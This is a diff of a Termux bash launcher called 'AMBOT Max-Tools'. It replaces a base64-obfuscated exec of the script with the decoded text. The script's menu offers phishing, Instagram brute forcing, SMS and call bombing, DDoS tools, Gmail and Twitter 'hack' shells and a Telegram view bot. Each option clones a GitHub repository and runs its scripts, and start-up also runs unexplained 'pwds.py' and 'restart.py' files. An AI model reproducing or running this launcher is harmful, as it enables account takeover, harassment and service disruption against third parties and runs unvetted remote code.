@@ -1,3 +1,205 @@
-#Encrypted By AMBOT
-import base64 
-exec(base64.b64decode('IyMjU0NSSVBUIEFNQk9UICEhIQojIS9iaW4vYmFzaAojdmVyc2lvbiAxLjAKcGlwMyBpbnN0YWxsIC1VIC1yIHJlcXVpcmVtZW50cy50eHQKY2xlYXIKcHJpbnRmICIgIFxlWzEwMW1cZVsxOzc3bSA6Ojo6Ojo6Ojo+Pj5XRUxDT01FIFRPPDw8Ojo6Ojo6Ojo6XGVbMG1cbiIgICAgIApwcmludGYgIiAgXGVbMTAxbVxlWzE7NzdtIDo6OkFNQk9UIE1heC1Ub29scyA6OjpcZVswbVxuIgoKcHl0aG9uMiBwd2RzLnB5CnB5dGhvbiBwd2RzLnB5CnB5dGhvbiByZXN0YXJ0LnB5CgojIFZhcmlhYmxlcwpiPSdcMDMzWzFtJwp1PSdcMDMzWzRtJwpibD0nXEVbMzBtJwpyPSdcRVszMW0nCmc9J1xFWzMybScKYnU9J1xFWzM0bScKbT0nXEVbMzVtJwpjPSdcRVszNm0nCnc9J1xFWzM3bScKZW5kYz0nXEVbMG0nCmVuZGE9J1wwMzNbMG0nCmJsdWU9J1xlWzE7MzRtJwpjeWFuPSdcZVsxOzM2bScKcmVkPSdcZVsxOzMxbScKCmZpZ2xldCBBTUJPVC1NSVgtVG9vbHMgfCBsb2xjYXQKCnNsZWVwIDEKCmVjaG8gLWUgJGci4paS4paS4paSICAgIOKWkuKWkuKWkiAgICDilpLilpLilpIgICAg4paS4paS4paSICAgIOKWkuKWkuKWkiAgICDilpLilpLilpIgICAg4paS4paS4paSICAgIOKWkuKWkuKWkiAgICDilpLilpLilpIgICAg4paS4paS4paSICAg4paS4paS4paSICAg4paS4paS4paSIiAgIAplY2hvIC1lICRnIiAgQSDilpLilpLilpIgIE0g4paS4paS4paSICBCIOKWkuKWkuKWkiBPIOKWkuKWkuKWkiAgVCDilpLilpLilpIgIFQg4paS4paS4paSIEUgIOKWkuKWkuKWkiBSICDilpLilpLilpIgTSAg4paS4paS4paSIFUgIOKWkuKWkuKWkiBYIOKWkuKWkuKWkiIKZWNobyAtZSAkZyLilpLilpLilpIgICAg4paS4paS4paSICAgIOKWkuKWkuKWkiAgICDilpLilpLilpIgICAg4paS4paS4paSICAgIOKWkuKWkuKWkiAgICDilpLilpLilpIgICAg4paS4paS4paSICAgIOKWkuKWkuKWkiAgICDilpLilpLilpIgICAg4paS4paS4paSICAg4paS4paS4paSICIgCmVjaG8gLWUgJGJsIi4iCmVjaG8gLWUgJGJ1ICJfX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fIgplY2hvIC1lICRidSAgIiBUb29scyAgICAgICA6IEFNQk9UIE1hWC1UT09MJHdoaXRlICAgICAgICAgICIgCmVjaG8gLWUgJGJ1ICAiIEF1dGhvciAgICAgIDogQWxsIE1hc3RlciBUZXJtdXggZXRjJHdoaXRlICAiIAplY2hvIC1lICRidSAgIiBUZWxlZ3JhbSAgICAgOiBAQU1CT1RZVCoqKiAkd2hpdGUgIiAKZWNobyAtZSAkYnUgICJUaGFuayxzIGZvciB1c2UgdGhpcyB0b29scyA6KSAgIgoKZWNobyAtZSAkYnUgICJfX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX18iIApzbGVlcCAxCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwojIENUUkwgKyBDCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwp0cmFwIGN0cmxfYyBJTlQKY3RybF9jKCkgewpjbGVhcgplY2hvIC1lICRyZWQifn4+IG9rLCAgLi4uICIKZWNobyAtZSAkY3lhbiIuLiIKc2xlZXAgMQplY2hvICIiCmVjaG8gLWUgJHIiLi4uIgpzbGVlcCAxCn0KCmxhZ2k9MQp3aGlsZSBbICRsYWdpIC1sdCAyMCBdOwpkbwoKc2xlZXAgMQplY2hvIC1lICRnIiAgICAg4paI4paI4paI4paI4paI4pWX4paI4paI4paI4paI4paI4pWX4paI4paI4paI4paI4paI4pWXTUVOVSDilojilojilojilojilojilZfilojilojilojilojilojilZfilojilojilojilojilojilZciCnNsZWVwIDIKZWNobyAtZSAkZyIgKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysgIgplY2hvIC1lICRnICIgICBbIDFdIOKchSBQSElTSU5HIE1vcmUgTWF4IFRvb2xzJHtlbmRhfSI7CmVjaG8gLWUgJGcgIiAgIFsgMl0g4pyFIEhhY2sgSW5zdGFncmFtIEJydXRGb3JjZSR7ZW5kYX0iOwplY2hvIC1lICRnICIgICBbIDNdIOKchSBTcGFtIFNtcy1jYWxsJHtlbmRhfSI7CmVjaG8gLWUgJGcgIiAgIFsgNF0g4pyFIElwLVRyYWNrZXIke2VuZGF9IjsKZWNobyAtZSAkZyAiICAgWyA1XSDinIUgVGVsZUdyYW0gRnJlZSBQb3N0IFZpZXdzJHtlbmRhfSI7CmVjaG8gLWUgJGciICAgIFsgNl0g4pyFIERkb3MgQXR0YWNrIFRvb2xzJHtlbmRhfSI7CmVjaG8gLWUgJGcgIiAgIFsgN10g4p2OIFlvdXR1YmUgQXV0b1ZpZXcgIChTb29uKSI7CmVjaG8gLWUgJGcgIiAgIFsgOF0g4p2OIEhhY2sgR21haWwgIChTb29uKSI7CmVjaG8gLWUgJGcgIiAgIFsgOV0g4pyFIEF1dG8gVXBkYXRlIE1hWC1UT09MJHtlbmRhfSI7CmVjaG8gLWUgJGcgIiAgIFsxMF0gSG93IHRvIFVzZSB0aGUgVG9vbC9TaG9ydCBUdXRvcmlhbCAgKFNvb24pIiA7CmVjaG8gLWUgJGcgIiAgIFsgMF0gTW9kYXIvRXhpdC9LaWxsJHtlbmRhfSI7CmVjaG8gIiIKZWNobyAtZSAkYnUgIkNob29zZSBhY2NvcmRpbmcgdG8geW91ciB0YXN0ZSA6KSIgCmVjaG8gLWUgJGJ1ICJKb2luIFRvIENoYW5uZWw9PT4gQEFNQk9UWVQgPD09WyBkb24ndCBzdWJzY3JpYmUgYXV0byBiYXJyZW4gYmVjYXVzZSBvZiB0aGUgYm9zczp2XSIKcmVhZCAtcCAiPT09PT4iIHBpbCAgOwoKZmlnbGV0IEFNQk9ULU1peC1Ub29McyB8IGxvbGNhdAojcGhzIHNoZWxwaXMKCmNhc2UgJHBpbCBpbgoxKWFwdCB1cGRhdGUKYXB0IHVwZ3JhZGUKcGtnIGluc3RhbGwgb3BlbnNzaApwa2cgaW5zdGFsbCBjdXJsCmdpdCBjbG9uZSBodHRwczovL2dpdGh1Yi5jb20vQWJoaU1vZHN6WVQvU01GCmNkIFNNRgpiYXNoIGluc3RhbGwuc2gKYmFzaCBzbWYuc2gKCjs7CgojIHBocyBiZQoKMikgZ2l0IGNsb25lIGh0dHBzOi8vZ2l0aHViLmNvbS9BYmhpTW9kc3pZVC9TTUYKY2QgU01GCnBpcDMgaW5zdGFsbCBjb2xvcmFtYQpiYXNoIHNldHVwCnB5dGhvbjMgaW5zYW0ucHkKc2xlZXAgMQplY2hvICJyb290IGR1bHUiCjs7CgojcGhzIHNvY2lhbGZpcwoKMykgYXB0IHVwZGF0ZQphcHQgdXBncmFkZQpnaXQgY2xvbmUgaHR0cHM6Ly9naXRodWIuY29tL0FiaGlNb2RzellUL1NNRgpjZCBTTUYKcGlwMyBpbnN0YWxsIHRib21iCnBpcDMgaW5zdGFsbCAtciByZXF1aXJlbWVudHMudHh0CnB5dGhvbjMgYm9tYmVyLnB5Cgo7OwoKI0lwLVRyYWNrZXIKCjQpIGdpdCBjbG9uZSBodHRwczovL2dpdGh1Yi5jb20vQWJoaU1vZHN6WVQvU01GCmNkIFNNRi9JcC1UcmFja2VyCnBrZyBpbnN0YWxsIHB5dGhvbi1waXAKcGlwMyBpbnN0YWxsIC1VIC1yIHJlcXVpcmVtZW50cy50eHQKCjs7CgojaGFjayBpZwoKNSkgZ2l0IGNsb25lIGh0dHBzOi8vZ2l0aHViLmNvbS9BTUJPVFRFU1QvQU1UR1ZpZXdzQm9UCmNkIEFNVEdWaWV3c0JvVApwaXAzIGluc3RhbGwgY29sb3JhbWEKcGlwMyBpbnN0YWxsIGJzNjQKcGlwIGluc3RhbGwgYnM2NApwaXAgaW5zdGFsbCAtciBhbS50eHQKcGlwMyBpbnN0YWxsIC1yIGFtLnR4dApweXRob24gYW0ucHkKcHl0aG9uMyBhbS5weQpzbGVlcCAxCmVjaG8gInJvb3QgZHVsdSIKCjs7Cgo2KSBhcHQgdXBkYXRlCmFwdCB1cGdyYWRlCmFwdCBpbnN0YWxsIGdpdApybSAtcmYgU01GCmdpdCBjbG9uZSBodHRwczovL2dpdGh1Yi5jb20vQWJoaU1vZHN6WVQvU01GCmNkIFNNRgpwaXAgaW5zdGFsbCAtciByZXF1aXJlbWVudHMudHh0CnBpcDMgaW5zdGFsbCAtciByZXF1aXJlbWVudHMudHh0CnB5dGhvbiBhbWRkb3MucHkKcHl0aG9uMyBhbWRkb3MucHkKOzsKCgo3KWdpdCBjbG9uZSBodHRwczovL2dpdGh1Yi5jb20vQWJoaU1vZHN6WVQvdHdlZXRzaGVsbApjZCB0d2VldHNoZWxsCmNobW9kICt4IHR3ZWV0c2hlbGwuc2gKYmFzaCB0d2VldHNoZWxsLnNoCnNsZWVwIDIKZWNobyAtZSAkZyAicm9vdCBkdWx1IG1ib2QiCgo7OwoKOCkgYXB0IHVwZGF0ZSAmJiBhcHQgdXBncmFkZQpnaXQgY2xvbmUgaHR0cHM6Ly9naXRodWIuY29tL0FiaGlNb2RzellUL2dtYWlsc2hlbGwuZ2l0CmNkIGdtYWlsc2hlbGwKYmFzaCBnbWFpbHNoZWxsLnNoCnNsZWVwIDEKZWNobyAtZSAkZyJyb290IGR1bHUsIGJhcnUgYmlzYSBqYWxhbiAiCgo7OwoKOSkgYXB0IHVwZGF0ZSAmJiBhcHQgdXBncmFkZQpjZCAuLgpybSAtcmYgaGFjawpjZCAKcm0gLXJmIGhhY2sKZ2l0IGNsb25lIGh0dHBzOi8vZ2l0aHViLmNvbS9BYmhpTW9kc3pZVC9oYWNrCmNkIGhhY2sKbHMKYmFzaCBhbS5zaApzbGVlcCAxCmVjaG8gLWUgJGciVXBkYXRlIERvbmUg4pyFIgoKOzsKCjEwKWVjaG8gLWUgJGJ1IlN0b2sgSGFiaXMiCgo7OwowKSBlY2hvIC1lICRidSJCeWUgIC0iIAplY2hvIC1lICRidSJUSEFOSydTIgpwcmludGYgIlxlWzEwM21cZVsxOzc3bUJZOyBGb3IgVXNlaW5nIEFNQk9UIE1heC1Ub29scyDwn6WxIFxlWzBtXG4iCnNsZWVwIDIKZXhpdAo7OwoKKikgZWNobyAiQ0hPT1NFIFRIRSBSSUdIVCBPTkUgISEiICB8IGxvbGNhdAplc2FjCmRvbmUKZG9uZQoK'))
+###SCRIPT AMBOT !!!
+#!/bin/bash
+#version 1.0
+pip3 install -U -r requirements.txt
+clear
+printf "  \e[101m\e[1;77m :::::::::>>>WELCOME TO<<<:::::::::\e[0m\n"     
+printf "  \e[101m\e[1;77m :::AMBOT Max-Tools :::\e[0m\n"
+
+python2 pwds.py
+python pwds.py
+python restart.py
+
+# Variables
+b='\033[1m'
+u='\033[4m'
+bl='\E[30m'
+r='\E[31m'
+g='\E[32m'
+bu='\E[34m'
+m='\E[35m'
+c='\E[36m'
+w='\E[37m'
+endc='\E[0m'
+enda='\033[0m'
+blue='\e[1;34m'
+cyan='\e[1;36m'
+red='\e[1;31m'
+
+figlet AMBOT-MIX-Tools | lolcat
+
+sleep 1
+
+echo -e $g"▒▒▒    ▒▒▒    ▒▒▒    ▒▒▒    ▒▒▒    ▒▒▒    ▒▒▒    ▒▒▒    ▒▒▒    ▒▒▒   ▒▒▒   ▒▒▒"   
+echo -e $g"  A ▒▒▒  M ▒▒▒  B ▒▒▒ O ▒▒▒  T ▒▒▒  T ▒▒▒ E  ▒▒▒ R  ▒▒▒ M  ▒▒▒ U  ▒▒▒ X ▒▒▒"
+echo -e $g"▒▒▒    ▒▒▒    ▒▒▒    ▒▒▒    ▒▒▒    ▒▒▒    ▒▒▒    ▒▒▒    ▒▒▒    ▒▒▒    ▒▒▒   ▒▒▒ " 
+echo -e $bl"."
+echo -e $bu "________________________________________"
+echo -e $bu  " Tools       : AMBOT MaX-TOOL$white          " 
+echo -e $bu  " Author      : All Master Termux etc$white  " 
+echo -e $bu  " Telegram     : @AMBOTYT*** $white " 
+echo -e $bu  "Thank,s for use this tools :)  "
+
+echo -e $bu  "_______________________________________" 
+sleep 1
+###################################################
+# CTRL + C
+###################################################
+trap ctrl_c INT
+ctrl_c() {
+clear
+echo -e $red"~~> ok,  ... "
+echo -e $cyan".."
+sleep 1
+echo ""
+echo -e $r"..."
+sleep 1
+}
+
+lagi=1
+while [ $lagi -lt 20 ];
+do
+
+sleep 1
+echo -e $g"     █████╗█████╗█████╗MENU █████╗█████╗█████╗"
+sleep 2
+echo -e $g" ++++++++++++++++++++++++++++++++++++++ "
+echo -e $g "   [ 1] ✅ PHISING More Max Tools${enda}";
+echo -e $g "   [ 2] ✅ Hack Instagram BrutForce${enda}";
+echo -e $g "   [ 3] ✅ Spam Sms-call${enda}";
+echo -e $g "   [ 4] ✅ Ip-Tracker${enda}";
+echo -e $g "   [ 5] ✅ TeleGram Free Post Views${enda}";
+echo -e $g"    [ 6] ✅ Ddos Attack Tools${enda}";
+echo -e $g "   [ 7] ❎ Youtube AutoView  (Soon)";
+echo -e $g "   [ 8] ❎ Hack Gmail  (Soon)";
+echo -e $g "   [ 9] ✅ Auto Update MaX-TOOL${enda}";
+echo -e $g "   [10] How to Use the Tool/Short Tutorial  (Soon)" ;
+echo -e $g "   [ 0] Modar/Exit/Kill${enda}";
+echo ""
+echo -e $bu "Choose according to your taste :)" 
+echo -e $bu "Join To Channel==> @AMBOTYT <==[ don't subscribe auto barren because of the boss:v]"
+read -p "====>" pil  ;
+
+figlet AMBOT-Mix-TooLs | lolcat
+#phs shelpis
+
+case $pil in
+1)apt update
+apt upgrade
+pkg install openssh
+pkg install curl
+git clone https://github.com/AbhiModszYT/SMF
+cd SMF
+bash install.sh
+bash smf.sh
+
+;;
+
+# phs be
+
+2) git clone https://github.com/AbhiModszYT/SMF
+cd SMF
+pip3 install colorama
+bash setup
+python3 insam.py
+sleep 1
+echo "root dulu"
+;;
+
+#phs socialfis
+
+3) apt update
+apt upgrade
+git clone https://github.com/AbhiModszYT/SMF
+cd SMF
+pip3 install tbomb
+pip3 install -r requirements.txt
+python3 bomber.py
+
+;;
+
+#Ip-Tracker
+
+4) git clone https://github.com/AbhiModszYT/SMF
+cd SMF/Ip-Tracker
+pkg install python-pip
+pip3 install -U -r requirements.txt
+
+;;
+
+#hack ig
+
+5) git clone https://github.com/AMBOTTEST/AMTGViewsBoT
+cd AMTGViewsBoT
+pip3 install colorama
+pip3 install bs64
+pip install bs64
+pip install -r am.txt
+pip3 install -r am.txt
+python am.py
+python3 am.py
+sleep 1
+echo "root dulu"
+
+;;
+
+6) apt update
+apt upgrade
+apt install git
+rm -rf SMF
+git clone https://github.com/AbhiModszYT/SMF
+cd SMF
+pip install -r requirements.txt
+pip3 install -r requirements.txt
+python amddos.py
+python3 amddos.py
+;;
+
+
+7)git clone https://github.com/AbhiModszYT/tweetshell
+cd tweetshell
+chmod +x tweetshell.sh
+bash tweetshell.sh
+sleep 2
+echo -e $g "root dulu mbod"
+
+;;
+
+8) apt update && apt upgrade
+git clone https://github.com/AbhiModszYT/gmailshell.git
+cd gmailshell
+bash gmailshell.sh
+sleep 1
+echo -e $g"root dulu, baru bisa jalan "
+
+;;
+
+9) apt update && apt upgrade
+cd ..
+rm -rf hack
+cd 
+rm -rf hack
+git clone https://github.com/AbhiModszYT/hack
+cd hack
+ls
+bash am.sh
+sleep 1
+echo -e $g"Update Done ✅"
+
+;;
+
+10)echo -e $bu"Stok Habis"
+
+;;
+0) echo -e $bu"Bye  -" 
+echo -e $bu"THANK'S"
+printf "\e[103m\e[1;77mBY; For Useing AMBOT Max-Tools 🥱 \e[0m\n"
+sleep 2
+exit
+;;
+
+*) echo "CHOOSE THE RIGHT ONE !!"  | lolcat
+esac
+done
+done
+
